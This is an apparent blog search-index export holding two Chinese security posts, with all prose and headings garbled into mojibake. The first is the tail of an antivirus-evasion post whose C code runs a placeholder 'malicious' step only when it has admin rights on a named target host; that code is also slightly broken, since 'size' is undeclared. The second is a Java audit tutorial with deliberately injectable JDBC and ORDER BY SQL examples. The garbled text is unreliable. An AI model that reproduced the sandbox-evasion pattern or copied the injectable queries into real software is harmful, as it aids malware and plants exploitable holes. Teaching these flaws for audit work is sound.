class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">IsAdmin</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;</span><br><span class="line">    PSID AdministratorsGroup;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">AllocateAndInitializeSid</span>(&amp;NtAuthority, <span class="number">2</span>, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, &amp;AdministratorsGroup))</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    </span><br><span class="line">    BOOL isAdmin;</span><br><span class="line">    <span class="built_in">CheckTokenMembership</span>(<span class="literal">NULL</span>, AdministratorsGroup, &amp;isAdmin);</span><br><span class="line">    <span class="built_in">FreeSid</span>(AdministratorsGroup);</span><br><span class="line">    <span class="keyword">return</span> isAdmin;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">IsTargetMachine</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">char</span> hostname[<span class="number">256</span>];</span><br><span class="line">    <span class="built_in">GetComputerName</span>(hostname, &amp;size);</span><br><span class="line">    <span class="keyword">return</span> _stricmp(hostname, <span class="string">&quot;TARGET-MACHINE&quot;</span>) == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">IsAdmin</span>() &amp;&amp; <span class="built_in">IsTargetMachine</span>()) &#123;</span><br><span class="line">        <span class="comment">// æ‰§è¡Œæ¶æ„ä»£ç </span></span><br><span class="line">        <span class="built_in">MessageBox</span>(<span class="literal">NULL</span>, <span class="string">&quot;Malicious code executed!&quot;</span>, <span class="string">&quot;Info&quot;</span>, MB_OK);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="å‚è€ƒ">å‚è€ƒ</h2><hr class="footnotes-sep"><section class="footnotes"><ol class="footnotes-list"><li id="fn1" class="footnote-item"><p><a href="https://mp.weixin.qq.com/s/6TR4IV1uZgSUfb_pFnb1-w">https://mp.weixin.qq.com/s/6TR4IV1uZgSUfb_pFnb1-w</a> <a href="#fnref1" class="footnote-backref">â†©ï¸</a></p></li></ol></section>]]></content>
      
      
      <categories>
          
          <category> å…æ€ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å…æ€ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Javaä»£ç å®¡è®¡æ¼æ´ç‚¹(åŸºç¡€)</title>
      <link href="/2025/04/01/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%BC%8F%E6%B4%9E%E7%82%B9(%E5%9F%BA%E7%A1%80)/"/>
      <url>/2025/04/01/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%BC%8F%E6%B4%9E%E7%82%B9(%E5%9F%BA%E7%A1%80)/</url>
      
        <content type="html"><![CDATA[<h2 id="å®¡è®¡æµç¨‹">å®¡è®¡æµç¨‹</h2><h3 id="Servletç”Ÿå‘½å‘¨æœŸ"><code>Servlet</code>ç”Ÿå‘½å‘¨æœŸ</h3><p><img src="/2025/04/01/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%BC%8F%E6%B4%9E%E7%82%B9(%E5%9F%BA%E7%A1%80)/image-20250401162609929.png" alt="image-20250401162609929"></p><p><code>Servlet</code>ç”Ÿå‘½å‘¨æœŸå¯è¢«å®šä¹‰ä¸ºä»åˆ›å»ºç›´åˆ°æ¯ç­çš„æ•´ä¸ªè¿‡ç¨‹ã€‚ä»¥ä¸‹æ˜¯<code>Servlet</code>éµå¾ªçš„è¿‡ç¨‹<sup class="footnote-ref"><a href="#fn1" id="fnref1">[1]</a></sup>ï¼š</p><ul><li><p><code>Servlet</code>åˆå§‹åŒ–åè°ƒç”¨ <strong>init ()</strong> æ–¹æ³•ã€‚</p></li><li><p><code>Servlet</code>è°ƒç”¨ <strong>service()</strong> æ–¹æ³•æ¥å¤„ç†å®¢æˆ·ç«¯çš„è¯·æ±‚ã€‚</p></li><li><p><code>Servlet</code>é”€æ¯å‰è°ƒç”¨ <strong>destroy()</strong> æ–¹æ³•ã€‚</p></li><li><p>æœ€åï¼Œ<code>Servlet</code>æ˜¯ç”±<code>JVM</code>çš„åƒåœ¾å›æ”¶å™¨è¿›è¡Œåƒåœ¾å›æ”¶çš„ã€‚</p></li></ul><p>ç®€å•ä»‹ç»ä¸€ä¸‹ä½¿ç”¨åˆ°çš„å‡ ç§æ–¹æ³•ã€‚</p><ul><li><strong><code>init()</code>æ–¹æ³•</strong></li></ul><p><code>init</code>æ–¹æ³•è¢«è®¾è®¡æˆåªè°ƒç”¨ä¸€æ¬¡ã€‚å®ƒåœ¨ç¬¬ä¸€æ¬¡åˆ›å»º<code>Servlet</code>æ—¶è¢«è°ƒç”¨ï¼Œåœ¨åç»­æ¯æ¬¡ç”¨æˆ·è¯·æ±‚æ—¶ä¸å†è°ƒç”¨ã€‚å› æ­¤ï¼Œå®ƒæ˜¯ç”¨äºä¸€æ¬¡æ€§åˆå§‹åŒ–ã€‚</p><ul><li><strong><code>service()</code>æ–¹æ³•</strong></li></ul><p><code>service()</code>æ–¹æ³•æ˜¯æ‰§è¡Œå®é™…ä»»åŠ¡çš„ä¸»è¦æ–¹æ³•ã€‚<code>Servlet</code>å®¹å™¨ï¼ˆå³<code>Web</code>æœåŠ¡å™¨ï¼‰è°ƒç”¨<code>service()</code>æ–¹æ³•æ¥å¤„ç†æ¥è‡ªå®¢æˆ·ç«¯ï¼ˆæµè§ˆå™¨ï¼‰çš„è¯·æ±‚ï¼Œå¹¶æŠŠæ ¼å¼åŒ–çš„å“åº”å†™å›ç»™å®¢æˆ·ç«¯ã€‚</p><p>æ¯æ¬¡æœåŠ¡å™¨æ¥æ”¶åˆ°ä¸€ä¸ª<code>Servlet</code>è¯·æ±‚æ—¶ï¼ŒæœåŠ¡å™¨ä¼šäº§ç”Ÿä¸€ä¸ªæ–°çš„çº¿ç¨‹å¹¶è°ƒç”¨æœåŠ¡ã€‚<code>service()</code>æ–¹æ³•æ£€æŸ¥<code>HTTP</code>è¯·æ±‚ç±»å‹ï¼ˆ<code>GETã€POSTã€PUTã€DELETE </code>ç­‰ï¼‰ï¼Œå¹¶åœ¨é€‚å½“çš„æ—¶å€™è°ƒç”¨<code>doGetã€doPostã€doPutï¼ŒdoDelete</code>ç­‰æ–¹æ³•</p><ul><li><strong><code>destroy</code>æ–¹æ³•</strong></li></ul><p><code>destroy()</code>æ–¹æ³•åªä¼šè¢«è°ƒç”¨ä¸€æ¬¡ï¼Œåœ¨<code>Servlet</code>ç”Ÿå‘½å‘¨æœŸç»“æŸæ—¶è¢«è°ƒç”¨ã€‚<code>destroy()</code>æ–¹æ³•å¯ä»¥è®©æ‚¨çš„<code>Servlet</code>å…³é—­æ•°æ®åº“è¿æ¥ã€åœæ­¢åå°çº¿ç¨‹ã€æŠŠ<code>Cookie</code>åˆ—è¡¨æˆ–ç‚¹å‡»è®¡æ•°å™¨å†™å…¥åˆ°ç£ç›˜ï¼Œå¹¶æ‰§è¡Œå…¶ä»–ç±»ä¼¼çš„æ¸…ç†æ´»åŠ¨ã€‚</p><h3 id="Servletå®¡è®¡">Servletå®¡è®¡</h3><p>æ‰¾<code>Controller</code>æ–‡ä»¶ï¼Œæ‰¾<code>mapping</code>è·¯ç”±ã€‚</p><p>â€¦</p><h3 id="Springbootå®¡è®¡">Springbootå®¡è®¡</h3><p>æ‰¾<code>Controller</code>å†æ‰¾<code>mapping</code>è·¯ç”±ã€‚</p><p>â€¦</p><h2 id="SQLæ³¨å…¥">SQLæ³¨å…¥</h2><p><code>Java</code>ä¸­å¸¸è§çš„è¿æ¥æ•°æ®åº“çš„æ–¹å¼ï¼š<code>Mybatis</code>ã€<code>JDBC</code>ã€<code>Hibernate</code>ç­‰ã€‚åœ¨<code>Java</code>ä¸­å­˜åœ¨æ³¨å…¥çš„å‚æ•°ç±»å‹è¦ä¸ºå­—ç¬¦å‹ã€‚</p><h3 id="JDBCä¸­çš„SQLæ³¨å…¥"><code>JDBC</code>ä¸­çš„SQLæ³¨å…¥</h3><p><code>JDBC</code>ä¸­å¸¸ç”¨çš„å‡ ä¸ªæ‰§è¡Œ<code>SQL</code>è¯­å¥çš„æ–¹å¼<sup class="footnote-ref"><a href="#fn2" id="fnref2">[2]</a></sup>ï¼Œåˆ†åˆ«ä¸ºï¼š</p><ul><li><p><code>Statement</code>ï¼šç”¨äºæ‰§è¡Œæ™®é€šçš„<code>SQL</code>è¯­å¥ï¼Œä¸å¸¦æœ‰å‚æ•°ã€‚</p></li><li><p><code>PrepareedStatement</code>ï¼šç”¨äºæ‰§è¡Œé¢„ç¼–è¯‘çš„<code>SQL</code>è¯­å¥ï¼Œå¯ä»¥å¸¦æœ‰å‚æ•°ï¼Œé˜²æ­¢<code>SQL</code>æ³¨å…¥ã€‚</p></li><li><p><code>CallableStatement</code>ï¼šç”¨äºæ‰§è¡Œæ•°æ®åº“å­˜å‚¨è¿‡ç¨‹ã€‚</p></li></ul><h4 id="åŠ¨æ€æ‹¼æ¥å‚æ•°">åŠ¨æ€æ‹¼æ¥å‚æ•°</h4><p>ç›´æ¥å°†å‚æ•°æ‹¼æ¥åˆ°äº†<code>SQL</code>è¯­å¥ä¸­æ‰§è¡Œã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//åŠ¨æ€æ‹¼æ¥å­—ç¬¦ä¸²</span></span><br><span class="line">Stringsql=<span class="string">&quot;selectÂ *Â fromÂ usersÂ whereÂ idÂ =Â &#x27;&quot;</span>+Â idÂ +<span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">ResultSetrs=Â statement.executeQuery(sql);</span><br></pre></td></tr></table></figure><h4 id="é”™è¯¯ä½¿ç”¨é¢„ç¼–è¯‘">é”™è¯¯ä½¿ç”¨é¢„ç¼–è¯‘</h4><p>åŸç†ï¼š<code>PreparedStatement</code>ä¸ä¼šå¯¹æ‹¼æ¥çš„å­—ç¬¦ä¸²è¿›è¡Œé¢„å¤„ç†ã€‚</p><p>æ­£ç¡®çš„ä½¿ç”¨é¢„ç¼–è¯‘ï¼Œä¸å­˜åœ¨æ³¨å…¥ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Â å®‰å…¨ä»£ç </span></span><br><span class="line">Stringsql=<span class="string">&quot;selectÂ *Â fromÂ usersÂ whereÂ idÂ =Â ?&quot;</span>;</span><br><span class="line">PreparedStatementpreparestatement=Â conn.prepareStatement(sql);</span><br><span class="line">Â Â Â Â Â Â Â Â preparestatement.setString(<span class="number">1</span>,Â username);</span><br><span class="line">ResultSetrs=Â preparestatement.executeQuery();</span><br></pre></td></tr></table></figure><p>é”™è¯¯ä½¿ç”¨é¢„ç¼–è¯‘ï¼Œå­˜åœ¨æ³¨å…¥ï¼ï¼ï¼</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//æ²¡æœ‰æ­£ç¡®ä½¿ç”¨é¢„ç¼–è¯‘æ–¹å¼ï¼ŒSQLè¯­å¥è¿˜æ˜¯è¿›è¡Œäº†åŠ¨æ€æ‹¼æ¥</span></span><br><span class="line">Stringsql=<span class="string">&quot;selectÂ *Â fromÂ usersÂ whereÂ idÂ =Â &#x27;&quot;</span>+Â idÂ +<span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">PreparedStatementpreparestatement=Â conn.prepareStatement(sql);</span><br><span class="line">ResultSetrs=Â preparestatement.executeQuery();</span><br></pre></td></tr></table></figure><p>ç®€å•è¯´ï¼Œç”±äºå¼€å‘äººå‘˜ç–å¿½æˆ–ç»éªŒä¸è¶³ç­‰åŸå› ï¼Œè™½ç„¶ä½¿ç”¨äº†é¢„ç¼–è¯‘ <code>PreparedStatement</code> ï¼Œä½†æ²¡æœ‰æ ¹æ®æ ‡å‡†æµç¨‹å¯¹å‚æ•°è¿›è¡Œæ ‡è®°ï¼Œä¾æ—§ä½¿ç”¨äº†åŠ¨æ€æ‹¼æ¥SQLè¯­å¥çš„æ–¹å¼ï¼Œè¿›è€Œé€ æˆSQLæ³¨å…¥æ¼æ´ã€‚</p><h4 id="Order-Byæ³¨å…¥"><code>Order By</code>æ³¨å…¥</h4><p>åœ¨ä½¿ç”¨<code>PreparedStatement</code>é¢„ç¼–è¯‘æ—¶ï¼Œä¼šå°†ä¼ é€’çš„ä»»æ„å‚æ•°é¢„ç¼–è¯‘ï¼Œè¿›è€Œå˜ä¸ºå­—ç¬¦ä¸²ã€‚è€Œ<code>order by</code>éœ€è¦çš„æ˜¯<strong>å­—æ®µå</strong>ï¼Œè€Œ<strong>ä¸æ˜¯å­—ç¬¦ä¸²</strong>ã€‚æ‰€ä»¥ï¼Œåœ¨ä½¿ç”¨<code>order by</code>æ—¶ï¼Œå°±ä¸èƒ½ä½¿ç”¨é¢„ç¼–è¯‘äº†ã€‚å› æ­¤ï¼Œ<code>order by</code>ä½ç½®ä¹Ÿæ˜¯å‡ºç°<code>sql</code>æ³¨å…¥é‡ç¾åŒºã€‚</p><p><strong>å­—æ®µå</strong>æ˜¯<code>SQL</code>è¯­å¥çš„ä¸€éƒ¨åˆ†ï¼Œè€Œå­—ç¬¦ä¸²ä¸æ˜¯ã€‚é¢„ç¼–è¯‘å<code>SQL</code>è¯­å¥å°±ä¼šå˜æˆ<code>ORDER BY 'username'</code>ï¼Œæ•…æŠ¥é”™ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//é”™è¯¯ä½¿ç”¨ï¼ŒæŠ¥é”™âš ï¸ã€‚</span></span><br><span class="line">Stringsql=<span class="string">&quot;SELECTÂ *Â FROMÂ usersÂ ORDERÂ BYÂ ?&quot;</span>;</span><br><span class="line">PreparedStatementpreparestatement=Â conn.prepareStatement(sql);</span><br><span class="line">Â Â Â Â Â Â Â Â preparestatement.setString(<span class="number">1</span>,Â username);</span><br><span class="line">ResultSetrs=Â preparestatement.executeQuery();</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥ï¼Œä»£ç ä¸­å¸¸å¸¸ä½¿ç”¨çš„æ–¹æ³•æ˜¯æ‹¼æ¥å­—æ®µï¼Œæ‹¼æ¥ä¸å½“å°±ä¼šå‡ºç°æ³¨å…¥é—®é¢˜ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//order by çš„sqlæ³¨å…¥ã€‚</span></span><br><span class="line">Stringsql=<span class="string">&quot;selectÂ *Â fromÂ users&quot;</span>+<span class="string">&quot;Â orderÂ byÂ &quot;</span>+Â id;</span><br><span class="line">PreparedStatementpreparestatement=Â conn.prepareStatement(sql);</span><br><span class="line">ResultSetrs=Â preparestatement.executeQuery();</span><br></pre></td></tr></table></figure><p>å®é™…ä»£ç åº”ç”¨ä¸­ï¼Œå¸¸å¸¸ä½¿ç”¨ç™½åå•çš„æ–¹å¼å»é™åˆ¶<strong>å­—æ®µå</strong>ï¼Œè¿›è€Œé˜²æ­¢æ³¨å…¥ã€‚</p><h3 id="Mybatisä¸­çš„SQLæ³¨å…¥"><code>Mybatis</code>ä¸­çš„<code>SQL</code>æ³¨å…¥</h3><p><code>MyBatis</code>æ˜¯ä¸€ä¸ªæµè¡Œçš„<code> Java</code> æŒä¹…å±‚æ¡†æ¶ï¼Œç”¨äºç®€åŒ–ä¸æ•°æ®åº“çš„äº¤äº’ã€‚å®ƒé€šè¿‡æä¾›ä¸€ç§å¯¹è±¡å…³ç³»æ˜ å°„ï¼ˆ<code>ORM</code>ï¼‰çš„æ–¹å¼ï¼Œä½¿å¾—<code> Java</code> ç¨‹åºå‘˜å¯ä»¥æ›´æ–¹ä¾¿åœ°æ‰§è¡Œæ•°æ®åº“æ“ä½œï¼ˆå¦‚æŸ¥è¯¢ã€æ’å…¥ã€æ›´æ–°ã€åˆ é™¤ï¼‰ã€‚ä¸ä¼ ç»Ÿçš„<code> JDBC</code> ç›¸æ¯”ï¼Œ<code>MyBatis</code> æä¾›äº†æ›´é«˜å±‚æ¬¡çš„æŠ½è±¡ï¼Œå¹¶ä¸”æ¯”<code> JPA</code>ï¼ˆ<code>Hibernate</code> ç­‰ï¼‰æ›´çµæ´»ã€æ˜“äºé…ç½®ã€‚</p><h4 id="MyBatisåŸºç¡€çŸ¥è¯†"><code>MyBatis</code>åŸºç¡€çŸ¥è¯†</h4><h5 id="MyBatisä¸»è¦ç‰¹ç‚¹"><code>MyBatis</code>ä¸»è¦ç‰¹ç‚¹</h5><ul><li><strong>SQLæ˜ å°„ï¼š</strong><code>MyBatis</code>å…è®¸å¼€å‘è€…ä½¿ç”¨åŸç”Ÿçš„<code>SQL</code>è¯­å¥æ¥æ“ä½œæ•°æ®åº“ã€‚å®ƒå°†<code>SQL</code>æŸ¥è¯¢ä¸<code>Java</code>æ–¹æ³•è¿›è¡Œæ˜ å°„ï¼Œä½¿å¾—å¼€å‘è€…å¯ä»¥å®Œå…¨æ§åˆ¶<code>SQL</code>æ‰§è¡Œè¿‡ç¨‹ï¼ŒåŒæ—¶äº«å—æ¡†æ¶å¸¦æ¥çš„ç®€åŒ–å’Œæ”¯æŒã€‚</li><li><strong>åŠ¨æ€SQLï¼š</strong> <code>MyBatis</code>æ”¯æŒåŠ¨æ€ç”Ÿæˆ<code>SQL</code>æŸ¥è¯¢ï¼Œæä¾›äº†<code>&lt;if&gt;</code>ã€<code>&lt;choose&gt;</code>ã€<code>&lt;foreach&gt;</code>ç­‰æ ‡ç­¾ï¼Œå¯ä»¥æ ¹æ®ä¸åŒçš„æ¡ä»¶åŠ¨æ€ç”Ÿæˆ<code>SQL</code>ï¼Œé¿å…äº†å†—é•¿ä¸”å¤æ‚çš„æ¡ä»¶åˆ¤æ–­é€»è¾‘ã€‚</li><li><strong>ç®€æ´çš„XMLé…ç½®ï¼š</strong> <code>MyBatis</code> ä½¿ç”¨<code> XML</code> æ–‡ä»¶æ¥é…ç½®æ•°æ®åº“æ˜ å°„ï¼Œå¼€å‘è€…é€šè¿‡å®šä¹‰ <code>SQL</code> è¯­å¥å’Œæ˜ å°„è§„åˆ™ï¼Œæ§åˆ¶<code> Java</code> å¯¹è±¡ä¸æ•°æ®åº“è¡¨ä¹‹é—´çš„æ˜ å°„å…³ç³»ã€‚</li><li><strong>æ¥å£å’Œæ³¨è§£æ”¯æŒï¼š</strong><code> MyBatis</code> æä¾›äº†åŸºäºæ¥å£çš„<code>API</code>ï¼Œå¼€å‘è€…å¯ä»¥åœ¨<code> Java</code> æ¥å£ä¸­å®šä¹‰æ•°æ®åº“æ“ä½œæ–¹æ³•ï¼Œå¹¶é€šè¿‡æ³¨è§£æˆ–è€… <code>XML</code>é…ç½®æ˜ å°„ <code>SQL</code> è¯­å¥ã€‚</li><li><strong>å¼ºå¤§çš„ç¼“å­˜æœºåˆ¶ï¼š</strong> <code>MyBatis</code> æä¾›äº†ä¸€çº§ç¼“å­˜å’ŒäºŒçº§ç¼“å­˜ã€‚ä¸€çº§ç¼“å­˜æ˜¯åŸºäº <code>SqlSession</code> çº§åˆ«çš„ç¼“å­˜ï¼ŒäºŒçº§ç¼“å­˜æ˜¯è·¨ <code>SqlSession</code> å…±äº«çš„ç¼“å­˜ï¼Œé»˜è®¤æƒ…å†µä¸‹å¯ç”¨ã€‚</li><li><strong>æ”¯æŒäº‹ç‰©ç®¡ç†ï¼š</strong> <code>MyBatis</code> æ”¯æŒä¸ <code>Java</code> çš„äº‹åŠ¡ç®¡ç†æ•´åˆï¼Œç¡®ä¿æ•°æ®åº“æ“ä½œçš„åŸå­æ€§å’Œä¸€è‡´æ€§ã€‚</li></ul><h5 id="Mybatisçš„å·¥ä½œåŸç†"><code>Mybatis</code>çš„å·¥ä½œåŸç†</h5><ul><li><p>**<code>SqlSessionFactory</code>:**è¿™æ˜¯ MyBatis çš„æ ¸å¿ƒå·¥å‚ç±»ï¼Œè´Ÿè´£åˆ›å»º <code>SqlSession</code> å¯¹è±¡ã€‚<code>SqlSession</code> æ˜¯ MyBatis ä¸­ç”¨äºæ‰§è¡Œ <code>SQL</code> è¯­å¥çš„ä¸»è¦æ¥å£ï¼Œå®ƒé€šè¿‡é…ç½®æ–‡ä»¶è¯»å–æ•°æ®åº“è¿æ¥ä¿¡æ¯ï¼Œåˆ›å»ºå¹¶ç»´æŠ¤æ•°æ®åº“è¿æ¥ã€‚</p></li><li><p>**<code>Mapper XML</code>æ–‡ä»¶ï¼š**åœ¨<code>MyBatis</code>ä¸­ï¼Œ<code>SQL</code>è¯­å¥é€šå¸¸åœ¨<code>XML</code>é…ç½®æ–‡ä»¶ä¸­å®šä¹‰ï¼Œå¼€å‘è€…éœ€è¦ä¸ºæ¯ä¸ªæ•°æ®åº“æ“ä½œç¼–å†™å¯¹åº”çš„<code>Mapper</code>æ–‡ä»¶ã€‚è¿™ä¸ªæ–‡ä»¶ä¼šåŒ…å«<code>SQL</code>è¯­å¥åŠå…¶æ˜ å°„è§„åˆ™ã€‚</p></li><li><p>**<code>Mapper</code>æ¥å£ï¼š**å¼€å‘è€…é€šå¸¸ä¼šåˆ›å»ºæ¥å£ï¼Œå®šä¹‰ä¸€äº›æ–¹æ³•ï¼Œè¿™äº›æ–¹æ³•é€šè¿‡<code>XML</code>æˆ–æ³¨è§£æ¥ä¸å…·ä½“çš„<code>SQL</code>è¯­å¥è¿›è¡Œç»‘å®šã€‚</p></li><li><p>**æ˜ å°„è¿‡ç¨‹ï¼š**å½“åº”ç”¨ç¨‹åºè°ƒç”¨ <code>SqlSession</code> çš„æ–¹æ³•æ—¶ï¼Œ<code>MyBatis</code> ä¼šæ ¹æ® <code>Mapper</code> æ¥å£æˆ–æ³¨è§£æä¾›çš„<code>SQL</code>è¯­å¥ä¿¡æ¯æ‰§è¡Œç›¸åº”çš„æ•°æ®åº“æ“ä½œï¼Œå¹¶å°†ç»“æœè‡ªåŠ¨æ˜ å°„ä¸º<code>Java</code>å¯¹è±¡ï¼Œè¿”å›ç»™å¼€å‘è€…ã€‚</p></li></ul><h5 id="Mybatisçš„ä½¿ç”¨æ­¥éª¤"><code>Mybatis</code>çš„ä½¿ç”¨æ­¥éª¤</h5><ul><li><strong>é…ç½®<code>Mybatis</code>:</strong> é€šè¿‡<code>mybatis-config.xml</code> æ–‡ä»¶è¿›è¡Œé…ç½®ï¼Œé…ç½®æ•°æ®åº“è¿æ¥ã€ç¼“å­˜ã€æ—¥å¿—ç­‰ã€‚</li><li>**å®šä¹‰<code>Mapper</code>: ** åˆ›å»º<code>Mapper</code>æ¥å£æˆ–ç±»ï¼Œå®šä¹‰<code>SQL</code>æ“ä½œçš„æ–¹æ³•ã€‚</li><li><strong>ç¼–å†™<code>Mapper XML</code>:</strong> ä¸ºæ¯ä¸ª<code>SQL</code>æ“ä½œç¼–å†™å¯¹åº”çš„<code>XML</code>æ–‡ä»¶ï¼Œå®šä¹‰<code>SQL</code>è¯­å¥ä¸<code>Mapper</code>æ–¹æ³•çš„æ˜ å°„å…³</li><li><strong>åˆ›å»º<code>SqlSessionFactory</code>:</strong> é€šè¿‡é…ç½®æ–‡ä»¶åˆ›å»º <code>SqlSessionFactory</code>ï¼Œè·å– <code>SqlSession</code>ã€‚</li><li>**æ‰§è¡Œ<code>SQL</code>æ“ä½œï¼š**é€šè¿‡<code>SqlSession</code>æ‰§è¡Œ<code>SQL</code>è¯­å¥ï¼Œè·å–æŸ¥è¯¢ç»“æœæˆ–æ‰§è¡Œæ›´æ–°æ“ä½œã€‚</li></ul><p><strong><code>MyBatis</code>çš„ä»£ç ç¤ºä¾‹</strong></p><p>ä»¥ä¸‹æ˜¯ä¸€ä¸ªç®€å•çš„<code>MyBatis</code>çš„ä½¿ç”¨ç¤ºä¾‹ã€‚</p><p><code>MyBatis</code>é…ç½®æ–‡ä»¶<code>mybatis-config.xml</code></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xmlÂ version=<span class="string">&quot;1.0&quot;</span>Â encoding=<span class="string">&quot;UTF-8&quot;</span>Â ?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">Â Â Â Â <span class="tag">&lt;<span class="name">settings</span>&gt;</span></span><br><span class="line">Â Â Â Â Â Â Â Â <span class="tag">&lt;<span class="name">setting</span>Â <span class="attr">name</span>=<span class="string">&quot;logImpl&quot;</span>Â <span class="attr">value</span>=<span class="string">&quot;STDOUT_LOGGING&quot;</span>/&gt;</span></span><br><span class="line">Â Â Â Â <span class="tag">&lt;/<span class="name">settings</span>&gt;</span></span><br><span class="line">Â Â Â Â <span class="tag">&lt;<span class="name">mappers</span>&gt;</span></span><br><span class="line">Â Â Â Â Â Â Â Â <span class="tag">&lt;<span class="name">mapper</span>Â <span class="attr">resource</span>=<span class="string">&quot;com/example/mapper/UserMapper.xml&quot;</span>/&gt;</span></span><br><span class="line">Â Â Â Â <span class="tag">&lt;/<span class="name">mappers</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure><p>Mapper æ¥å£ <code>UserMapper.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span>Â <span class="keyword">interface</span>Â <span class="title class_">UserMapper</span>Â &#123;</span><br><span class="line">Â Â Â Â UserÂ <span class="title function_">getUserById</span><span class="params">(<span class="type">int</span>Â id)</span>;</span><br><span class="line">Â Â Â Â List&lt;User&gt;Â <span class="title function_">getAllUsers</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Mapper XML æ–‡ä»¶ <code>UserMapper.xml</code></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xmlÂ version=<span class="string">&quot;1.0&quot;</span>Â encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">mapper</span>Â <span class="attr">namespace</span>=<span class="string">&quot;com.example.mapper.UserMapper&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">select</span>Â <span class="attr">id</span>=<span class="string">&quot;getUserById&quot;</span>Â <span class="attr">resultType</span>=<span class="string">&quot;com.example.model.User&quot;</span>&gt;</span></span><br><span class="line">Â Â Â Â Â Â Â Â SELECTÂ id,Â name,Â emailÂ FROMÂ usersÂ WHEREid=#&#123;id&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">select</span>Â <span class="attr">id</span>=<span class="string">&quot;getAllUsers&quot;</span>Â <span class="attr">resultType</span>=<span class="string">&quot;com.example.model.User&quot;</span>&gt;</span></span><br><span class="line">Â Â Â Â Â Â Â Â SELECTÂ id,Â name,Â emailÂ FROMÂ users</span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mapper</span>&gt;</span></span><br></pre></td></tr></table></figure><p>Java ä¸»ç¨‹åº <code>Main.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.ibatis.session.SqlSession;</span><br><span class="line"><span class="keyword">import</span> 